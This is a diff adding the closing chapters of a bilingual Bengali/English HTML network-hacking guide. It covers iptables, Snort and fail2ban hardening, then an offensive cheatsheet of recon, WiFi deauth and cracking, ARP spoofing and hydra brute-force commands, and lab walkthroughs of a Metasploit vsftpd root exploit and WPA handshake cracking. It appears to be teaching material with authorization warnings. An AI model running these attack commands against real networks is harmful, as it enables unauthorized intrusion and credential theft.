+    <h2 class="sec">🔥 <span class="bn-text">iptables Hardening</span><span class="en-text">iptables Hardening</span></h2>
+    <div class="code"><span class="c"># Default policy: সব block করো</span>
+<span class="p">$</span> iptables -P INPUT DROP
+<span class="p">$</span> iptables -P FORWARD DROP
+<span class="p">$</span> iptables -P OUTPUT ACCEPT  <span class="c"># Outgoing allow</span>
+
+<span class="c"># Loopback allow</span>
+<span class="p">$</span> iptables -A INPUT -i lo -j ACCEPT
+
+<span class="c"># Established connections allow</span>
+<span class="p">$</span> iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+<span class="c"># Specific services allow</span>
+<span class="p">$</span> iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT  <span class="c"># SSH from LAN only</span>
+<span class="p">$</span> iptables -A INPUT -p tcp --dport 80 -j ACCEPT   <span class="c"># HTTP</span>
+<span class="p">$</span> iptables -A INPUT -p tcp --dport 443 -j ACCEPT  <span class="c"># HTTPS</span>
+
+<span class="c"># SYN Flood protection</span>
+<span class="p">$</span> iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
+<span class="p">$</span> iptables -A INPUT -p tcp --syn -j DROP
+
+<span class="c"># Port scan protection</span>
+<span class="p">$</span> iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP      <span class="c"># NULL scan</span>
+<span class="p">$</span> iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP       <span class="c"># Xmas scan</span>
+<span class="p">$</span> iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
+
+<span class="c"># Ping flood protection</span>
+<span class="p">$</span> iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
+
+<span class="c"># Log blocked packets</span>
+<span class="p">$</span> iptables -A INPUT -j LOG --log-prefix "DROPPED: " --log-level 4
+
+<span class="c"># Rules save করো</span>
+<span class="p">$</span> iptables-save > /etc/iptables/rules.v4
+<span class="p">$</span> iptables-restore < /etc/iptables/rules.v4</div>
+
+    <h2 class="sec">🚨 <span class="bn-text">Snort/Suricata — IDS/IPS</span><span class="en-text">Snort/Suricata — IDS/IPS</span></h2>
+    <div class="code"><span class="c"># Snort install</span>
+<span class="p">$</span> apt install snort
+
+<span class="c"># Basic run</span>
+<span class="p">$</span> snort -i eth0 -A console     <span class="c"># Console output</span>
+<span class="p">$</span> snort -i eth0 -l /var/log/snort
+
+<span class="c"># Custom Snort rules (/etc/snort/rules/local.rules)</span>
+<span class="c"># Rule format: action protocol src_ip src_port → dst_ip dst_port (options)</span>
+
+<span class="c"># Port scan detect</span>
+alert tcp any any -> $HOME_NET any (msg:"Port Scan Detected"; flags:S; threshold: type both, track by_src, count 20, seconds 10; sid:1000001;)
+
+<span class="c"># SSH brute force detect</span>
+alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force"; flow:to_server; threshold: type both, track by_src, count 5, seconds 60; sid:1000002;)
+
+<span class="c"># Nmap scan detect</span>
+alert tcp any any -> $HOME_NET any (msg:"Nmap SYN Scan"; flags:S; threshold: type both, track by_src, count 100, seconds 5; sid:1000003;)
+
+<span class="c"># Suricata (faster, multi-threaded)</span>
+<span class="p">$</span> apt install suricata
+<span class="p">$</span> suricata -i eth0 -l /var/log/suricata
+<span class="p">$</span> suricata-update              <span class="c"># Rules update</span></div>
+
+    <h2 class="sec">📶 <span class="bn-text">WiFi Security Hardening</span><span class="en-text">WiFi Security Hardening</span></h2>
+    <div class="code"><span class="c">════ Router/AP Security Checklist ════</span>
+
+<span class="c">[✓] WPA3 enable করো (অথবা WPA2-AES minimum)</span>
+<span class="c">[✓] WPS disable করো — router settings → WPS = OFF</span>
+<span class="c">[✓] Strong password: 20+ characters, random</span>
+<span class="c">    Bad:  "MyNetwork123"</span>
+<span class="c">    Good: "j8#Kp2@mX9$vL5!qR3nW"</span>
+<span class="c">[✓] Router admin password পরিবর্তন করো (admin/admin নয়)</span>
+<span class="c">[✓] Remote management disable করো</span>
+<span class="c">[✓] Guest network আলাদা VLAN-এ রাখো</span>
+<span class="c">[✓] MAC filtering enable করো (extra layer)</span>
+<span class="c">[✓] SSID broadcast hide করো (obscurity only, not security)</span>
+<span class="c">[✓] Firmware update রাখো</span>
+<span class="c">[✓] Transmit power কমাও (range limit করো)</span>
+<span class="c">[✓] 5GHz band ব্যবহার করো (shorter range)</span>
+
+<span class="c">════ WPA2 Password Testing ════</span>
+<span class="c"># নিজের network-এর password strength test করো</span>
+<span class="p">$</span> aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap
+<span class="c"># যদি পাওয়া যায় → পাসওয়ার্ড change করো!</span>
+
+<span class="c">════ Rogue AP Detection ════</span>
+<span class="p">$</span> airodump-ng wlan0mon          <span class="c"># Same SSID-এর একাধিক AP দেখলে সন্দেহ</span>
+<span class="p">$</span> waidps                        <span class="c"># Wireless attack detection</span></div>
+
+    <h2 class="sec">📊 <span class="bn-text">Network Monitoring</span><span class="en-text">Network Monitoring</span></h2>
+    <div class="code"><span class="c"># Fail2Ban — brute force protection</span>
+<span class="p">$</span> apt install fail2ban
+<span class="p">$</span> systemctl enable fail2ban
+
+<span class="c"># /etc/fail2ban/jail.local</span>
+[sshd]
+enabled = true
+port    = ssh
+maxretry = 3        <span class="c"># 3 failed attempts</span>
+bantime  = 3600     <span class="c"># 1 hour ban</span>
+findtime = 600      <span class="c"># 10 minute window</span>
+
+[http-auth]
+enabled = true
+maxretry = 5
+bantime  = 86400    <span class="c"># 24 hour ban</span>
+
+<span class="c"># Status দেখো</span>
+<span class="p">$</span> fail2ban-client status
+<span class="p">$</span> fail2ban-client status sshd
+<span class="p">$</span> fail2ban-client unban 192.168.1.50
+
+<span class="c"># auditd — system call monitoring</span>
+<span class="p">$</span> apt install auditd
+<span class="p">$</span> auditctl -w /etc/passwd -p rwa    <span class="c"># passwd file monitor</span>
+<span class="p">$</span> auditctl -w /etc/shadow -p rwa
+<span class="p">$</span> ausearch -f /etc/passwd          <span class="c"># Log দেখো</span>
+
+<span class="c"># Network traffic monitoring</span>
+<span class="p">$</span> iftop -i eth0                     <span class="c"># Real-time bandwidth</span>
+<span class="p">$</span> nethogs eth0                      <span class="c"># Per-process bandwidth</span>
+<span class="p">$</span> ntopng                            <span class="c"># Web-based monitor</span></div>
+
+    <div class="chapter-summary">
+      <h3>✅ Chapter 10 Summary</h3>
+      <ul>
+        <li>✔ <span class="bn-text">Default DROP policy → only allowed traffic pass করো</span></li>
+        <li>✔ <span class="bn-text">Snort rules দিয়ে port scan, brute force detect করো</span></li>
+        <li>✔ <span class="bn-text">WPS বন্ধ করো, WPA3 বা WPA2-AES ব্যবহার করো</span></li>
+        <li>✔ <span class="bn-text">Fail2Ban = brute force-এর বিরুদ্ধে সেরা defense</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- CH11: TOOLS REFERENCE -->
+<div class="chapter ch11">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 11</div>
+    <div class="chapter-title">🔧 <span class="bn-text">Tools Reference</span><span class="en-text">Tools Reference</span></div>
+    <div class="chapter-desc"><span class="bn-text">Network Security-র সব গুরুত্বপূর্ণ tool এক জায়গায়</span><span class="en-text">All important network security tools in one place</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">📋 <span class="bn-text">Complete Tools Reference</span><span class="en-text">Complete Tools Reference</span></h2>
+    <table>
+      <thead><tr><th>Tool</th><th>Category</th><th><span class="bn-text">কাজ</span></th><th>Install</th></tr></thead>
+      <tbody>
+        <tr><td><strong>nmap</strong></td><td>Scanning</td><td><span class="bn-text">Port scan, OS/service detect, NSE scripts</span></td><td>Pre-installed (Kali)</td></tr>
+        <tr><td><strong>masscan</strong></td><td>Scanning</td><td><span class="bn-text">Ultra-fast internet-wide scan</span></td><td><code>apt install masscan</code></td></tr>
+        <tr><td><strong>netdiscover</strong></td><td>Discovery</td><td><span class="bn-text">ARP-based host discovery</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>wireshark</strong></td><td>Analysis</td><td><span class="bn-text">GUI packet capture ও analysis</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>tcpdump</strong></td><td>Analysis</td><td><span class="bn-text">CLI packet capture</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>aircrack-ng</strong></td><td>Wireless</td><td><span class="bn-text">WEP/WPA crack suite</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>hashcat</strong></td><td>Password</td><td><span class="bn-text">GPU-based hash cracking</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>hydra</strong></td><td>Brute Force</td><td><span class="bn-text">Online network brute force</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>bettercap</strong></td><td>MITM</td><td><span class="bn-text">ARP spoof, MITM framework</span></td><td><code>apt install bettercap</code></td></tr>
+        <tr><td><strong>metasploit</strong></td><td>Exploitation</td><td><span class="bn-text">Exploit framework</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>hcxdumptool</strong></td><td>Wireless</td><td><span class="bn-text">PMKID/handshake capture</span></td><td><code>apt install hcxdumptool</code></td></tr>
+        <tr><td><strong>reaver</strong></td><td>Wireless</td><td><span class="bn-text">WPS PIN attack</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>enum4linux</strong></td><td>SMB</td><td><span class="bn-text">Windows/Samba enumeration</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>crackmapexec</strong></td><td>Windows</td><td><span class="bn-text">Windows network auditing</span></td><td><code>apt install crackmapexec</code></td></tr>
+        <tr><td><strong>responder</strong></td><td>Windows</td><td><span class="bn-text">LLMNR/NBT-NS poisoning</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>snort</strong></td><td>Defense</td><td><span class="bn-text">IDS/IPS</span></td><td><code>apt install snort</code></td></tr>
+        <tr><td><strong>fail2ban</strong></td><td>Defense</td><td><span class="bn-text">Brute force protection</span></td><td><code>apt install fail2ban</code></td></tr>
+        <tr><td><strong>gobuster</strong></td><td>Web/DNS</td><td><span class="bn-text">Directory ও DNS brute force</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>wifite</strong></td><td>Wireless</td><td><span class="bn-text">Automated WiFi attack tool</span></td><td>Pre-installed</td></tr>
+        <tr><td><strong>proxychains</strong></td><td>Anonymity</td><td><span class="bn-text">Tool-এর traffic proxy করো</span></td><td>Pre-installed</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">⌨️ <span class="bn-text">Quick Command Cheatsheet</span><span class="en-text">Quick Command Cheatsheet</span></h2>
+    <div class="code"><span class="c">═══ NETWORK RECON ═══</span>
+nmap -sV -O -A target           <span class="c"># Full aggressive scan</span>
+nmap -p- -T4 target             <span class="c"># All ports fast</span>
+netdiscover -r 192.168.1.0/24   <span class="c"># ARP discovery</span>
+dig target.com ANY              <span class="c"># DNS all records</span>
+enum4linux -a target            <span class="c"># Windows enum</span>
+
+<span class="c">═══ WIRELESS ═══</span>
+airmon-ng start wlan0                           <span class="c"># Monitor mode</span>
+airodump-ng wlan0mon                            <span class="c"># Network scan</span>
+airodump-ng -c 6 --bssid BSSID -w out wlan0mon <span class="c"># Capture</span>
+aireplay-ng -0 5 -a BSSID wlan0mon             <span class="c"># Deauth</span>
+aircrack-ng out-01.cap -w rockyou.txt          <span class="c"># Crack</span>
+hcxpcapngtool -o hash.hc22000 out-01.cap       <span class="c"># Convert</span>
+hashcat -m 22000 hash.hc22000 rockyou.txt      <span class="c"># GPU crack</span>
+
+<span class="c">═══ MITM ═══</span>
+echo 1 > /proc/sys/net/ipv4/ip_forward         <span class="c"># Enable forward</span>
+arpspoof -i eth0 -t victim gateway             <span class="c"># ARP spoof</span>
+bettercap -iface eth0                          <span class="c"># Bettercap</span>
+tcpdump -i eth0 -A port 80                     <span class="c"># HTTP sniff</span>
+
+<span class="c">═══ BRUTE FORCE ═══</span>
+hydra -l root -P rockyou.txt ssh://target      <span class="c"># SSH</span>
+hydra -l admin -P pass.txt ftp://target        <span class="c"># FTP</span>
+hydra -l admin -P pass.txt rdp://target        <span class="c"># RDP</span>
+
+<span class="c">═══ ANONYMITY ═══</span>
+macchanger -r wlan0             <span class="c"># Random MAC</span>
+proxychains nmap target         <span class="c"># Via proxy</span>
+ssh -D 1080 user@server         <span class="c"># SOCKS proxy</span>
+wg-quick up wg0                 <span class="c"># WireGuard VPN</span>
+
+<span class="c">═══ DEFENSE ═══</span>
+iptables -P INPUT DROP          <span class="c"># Default block</span>
+fail2ban-client status sshd     <span class="c"># Ban status</span>
+snort -i eth0 -A console        <span class="c"># IDS mode</span>
+suricata -i eth0                <span class="c"># Suricata IDS</span></div>
+  </div>
+</div>
+
+<!-- CH12: REAL WORLD LAB -->
+<div class="chapter ch12">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 12</div>
+    <div class="chapter-title">🚀 <span class="bn-text">Real-World Lab Scenarios</span><span class="en-text">Real-World Lab Scenarios</span></div>
+    <div class="chapter-desc"><span class="bn-text">Home Lab Setup, Practice Scenarios, CTF Network Challenges</span><span class="en-text">Home Lab Setup, Practice Scenarios, CTF Network Challenges</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🏠 <span class="bn-text">Home Lab Setup করো</span><span class="en-text">Set Up Your Home Lab</span></h2>
+    <div class="code"><span class="c">════ VirtualBox Lab Setup ════</span>
+
+<span class="c">Machines তৈরি করো:</span>
+1. <span class="g">Kali Linux</span>    — Attacker machine (2GB RAM, 2 CPU)
+2. <span class="g">Metasploitable2</span> — Vulnerable Linux target
+3. <span class="g">Windows 7/10</span>  — Windows target (DVWA, VulnHub)
+4. <span class="g">Ubuntu Server</span> — Web server target
+
+<span class="c">Network Settings:</span>
+All machines → Host-Only Adapter → vboxnet0
+অথবা Internal Network → "labnet"
+
+<span class="c">Metasploitable2 download:</span>
+https://sourceforge.net/projects/metasploitable/
+
+<span class="c">Default credentials:</span>
+Username: msfadmin
+Password: msfadmin
+
+<span class="c">Vulnerable services in Metasploitable2:</span>
+Port 21   — vsftpd 2.3.4 (backdoor!)
+Port 22   — OpenSSH 4.7
+Port 23   — Telnet
+Port 25   — Postfix
+Port 80   — Apache + DVWA + phpMyAdmin
+Port 139  — Samba (username map script vuln)
+Port 3306 — MySQL (no password for root!)
+Port 5432 — PostgreSQL
+Port 6667 — IRC (Unreal IRCd backdoor)
+Port 8180 — Apache Tomcat</div>
+
+    <h2 class="sec">🎯 <span class="bn-text">Lab Scenario 1: Full Network Pentest</span><span class="en-text">Lab Scenario 1: Full Network Pentest</span></h2>
+    <div class="code"><span class="c">Target: Metasploitable2 (192.168.56.101)</span>
+<span class="c">Attacker: Kali Linux (192.168.56.100)</span>
+
+<span class="c">STEP 1: Reconnaissance</span>
+<span class="p">$</span> nmap -sV -O -A 192.168.56.101
+<span class="g">[+] 21/tcp  open  ftp     vsftpd 2.3.4</span>
+<span class="g">[+] 22/tcp  open  ssh     OpenSSH 4.7</span>
+<span class="g">[+] 80/tcp  open  http    Apache 2.2.8</span>
+<span class="g">[+] 3306/tcp open mysql   MySQL 5.0.51a</span>
+
+<span class="c">STEP 2: Vulnerability Check</span>
+<span class="p">$</span> nmap --script=vuln 192.168.56.101
+<span class="g">[!] vsftpd 2.3.4 - Backdoor Command Execution</span>
+
+<span class="c">STEP 3: Exploit vsftpd backdoor</span>
+<span class="p">$</span> msfconsole
+msf> use exploit/unix/ftp/vsftpd_234_backdoor
+msf> set RHOSTS 192.168.56.101
+msf> run
+<span class="g">[+] Command shell session 1 opened!</span>
+<span class="g">id</span>
+<span class="g">uid=0(root) gid=0(root) groups=0(root)</span>
+
+<span class="c">STEP 4: Post Exploitation</span>
+<span class="p">$</span> cat /etc/passwd
+<span class="p">$</span> cat /etc/shadow
+<span class="p">$</span> uname -a
+<span class="p">$</span> ss -tlnp</div>
+
+    <h2 class="sec">📶 <span class="bn-text">Lab Scenario 2: WiFi Security Test</span><span class="en-text">Lab Scenario 2: WiFi Security Test</span></h2>
+    <div class="code"><span class="c">Target: নিজের Home WiFi (authorized!)</span>
+<span class="c">Hardware: Alfa AWUS036NHA adapter</span>
+
+<span class="c">STEP 1: Monitor mode enable</span>
+<span class="p">$</span> airmon-ng check kill
+<span class="p">$</span> airmon-ng start wlan1
+<span class="g">monitor mode enabled on wlan1mon</span>
+
+<span class="c">STEP 2: Target scan</span>
+<span class="p">$</span> airodump-ng wlan1mon
+<span class="g"> BSSID              PWR  CH  ENC   ESSID</span>
+<span class="g"> AA:BB:CC:DD:EE:FF  -55   6  WPA2  MyHomeNetwork</span>
+
+<span class="c">STEP 3: Capture handshake</span>
+<span class="p">$</span> airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w test wlan1mon
+
+<span class="c">STEP 4: Force handshake (deauth)</span>
+<span class="p">$</span> aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF wlan1mon
+<span class="g">WPA handshake: AA:BB:CC:DD:EE:FF  ← এটা দেখলেই capture হয়েছে</span>
+
+<span class="c">STEP 5: Password test</span>
+<span class="p">$</span> hcxpcapngtool -o hash.hc22000 test-01.cap
+<span class="p">$</span> hashcat -m 22000 hash.hc22000 rockyou.txt
+
+<span class="c">Result যদি পাওয়া যায় → password দুর্বল → পরিবর্তন করো!</span></div>
+
+    <h2 class="sec">🌐 <span class="bn-text">Online Practice Platforms</span><span class="en-text">Online Practice Platforms</span></h2>
+    <table>
+      <thead><tr><th>Platform</th><th>URL</th><th><span class="bn-text">ধরন</span></th><th><span class="bn-text">মূল্য</span></th></tr></thead>
+      <tbody>
+        <tr><td><strong>TryHackMe</strong></td><td>tryhackme.com</td><td>Guided labs, Network rooms</td><td>Free + Premium</td></tr>
+        <tr><td><strong>HackTheBox</strong></td><td>hackthebox.com</td><td>Real machines, CTF</td><td>Free + VIP</td></tr>
+        <tr><td><strong>VulnHub</strong></td><td>vulnhub.com</td><td>VM download, offline</td><td>Free</td></tr>
+        <tr><td><strong>PentesterLab</strong></td><td>pentesterlab.com</td><td>Web + Network</td><td>Free + Pro</td></tr>
+        <tr><td><strong>OffSec Proving Grounds</strong></td><td>offensive-security.com</td><td>Network pentesting</td><td>Paid</td></tr>
+        <tr><td><strong>PicoCTF</strong></td><td>picoctf.org</td><td>CTF for beginners</td><td>Free</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🎓 <span class="bn-text">Certification Roadmap</span><span class="en-text">Certification Roadmap</span></h2>
+    <div class="roadmap">
+      <div class="road-item"><span>🟢</span><div><strong>CompTIA Network+</strong> — <span class="bn-text">Networking fundamentals, এটা দিয়ে শুরু করো</span></div></div>
+      <div class="road-item blue"><span>🔵</span><div><strong>CompTIA Security+</strong> — <span class="bn-text">Security basics, industry standard</span></div></div>
+      <div class="road-item orange"><span>🟠</span><div><strong>CEH (Certified Ethical Hacker)</strong> — <span class="bn-text">Network hacking techniques</span></div></div>
+      <div class="road-item red"><span>🔴</span><div><strong>eJPT (eLearnSecurity Junior Pentest)</strong> — <span class="bn-text">Practical, beginner pentest</span></div></div>
+      <div class="road-item purple"><span>🟣</span><div><strong>OSCP (Offensive Security)</strong> — <span class="bn-text">Gold standard — সবচেয়ে কঠিন ও সম্মানিত</span></div></div>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🎯 <span class="bn-text">তুমি এখন কী কী পারো</span><span class="en-text">What You Can Now Do</span></h3>
+      <ul>
+        <li>🌐 <span class="bn-text">OSI/TCP-IP বুঝতে ও কোথায় attack হয় জানতে পারো</span></li>
+        <li>🔍 <span class="bn-text">Nmap দিয়ে comprehensive network reconnaissance করতে পারো</span></li>
+        <li>📶 <span class="bn-text">WEP/WPA/WPA2 wireless security বুঝতে ও test করতে পারো</span></li>
+        <li>🎭 <span class="bn-text">ARP Spoof, DNS Spoof, MITM attack করতে পারো (lab-এ)</span></li>
+        <li>👃 <span class="bn-text">Wireshark/tcpdump দিয়ে network traffic analyze করতে পারো</span></li>
+        <li>🔥 <span class="bn-text">Firewall rules ও IDS configure করতে পারো</span></li>
+        <li>🔒 <span class="bn-text">VPN ও SSH tunnel setup করতে পারো</span></li>
+        <li>🛡️ <span class="bn-text">Network hardening ও defense implement করতে পারো</span></li>
+      </ul>
+    </div>
+
+    <div style="text-align:center;margin-top:50px;padding:30px;background:#0d1b2a;border-radius:12px;">
+      <p style="font-size:20px;color:#2dc653;margin-bottom:10px;">📡 "The network is the battlefield — know it better than your enemy."</p>
+      <p style="color:rgba(255,255,255,0.7)">
+        <span class="bn-text">সব কিছু শুধুমাত্র নিজের network বা authorized lab-এ practice করো। অন্যের system-এ permission ছাড়া কাজ করা আইনত দণ্ডনীয়।</span>
+        <span class="en-text">Practice everything only on your own network or authorized lab. Accessing others' systems without permission is punishable by law.</span>
+      </p>
+      <p style="margin-top:12px;font-size:13px;color:#2dc653;">Network Hacking & Wireless Security v1.0 — 12 Chapters | সম্পূর্ণ বাংলা গাইড</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const body = document.body;
+body.classList.add('light-mode');
+function toggleTheme() {
+  const btn = document.getElementById('themeBtn');
+  if (body.classList.contains('light-mode')) {
+    body.classList.replace('light-mode','dark-mode');
+    btn.textContent='☀️ Light Mode';btn.style.background='#ffd60a';btn.style.color='#0d1b2a';
+    localStorage.setItem('theme','dark');
+  } else {
+    body.classList.replace('dark-mode','light-mode');
+    btn.textContent='🌙 Dark Mode';btn.style.background='#2dc653';btn.style.color='#0d1b2a';
+    localStorage.setItem('theme','light');
+  }
+}
+function toggleLang() {
+  const btn = document.getElementById('langBtn');
+  if (body.classList.contains('lang-en')) {
+    body.classList.remove('lang-en');
+    btn.textContent='🇬🇧 English';btn.style.background='#0077b6';
+    localStorage.setItem('lang','bn');
+  } else {
+    body.classList.add('lang-en');
+    btn.textContent='🇧🇩 বাংলা';btn.style.background='#e63946';
+    localStorage.setItem('lang','en');
+  }
+}
+function savePDF() {
+  const c = document.querySelector('.controls');
+  c.style.display='none';
+  window.print();
+  setTimeout(()=>{c.style.display='flex';},500);
+}
+window.addEventListener('DOMContentLoaded',()=>{
+  const t=localStorage.getItem('theme'),l=localStorage.getItem('lang');
+  if(t==='dark'){
+    body.classList.replace('light-mode','dark-mode');
+    const b=document.getElementById('themeBtn');
+    if(b){b.textContent='☀️ Light Mode';b.style.background='#ffd60a';b.style.color='#0d1b2a';}
+  }
+  if(l==='en'){
+    body.classList.add('lang-en');
+    const b=document.getElementById('langBtn');
+    if(b){b.textContent='🇧🇩 বাংলা';b.style.background='#e63946';}
+  }
+});
+</script>
+</body>
+</html>
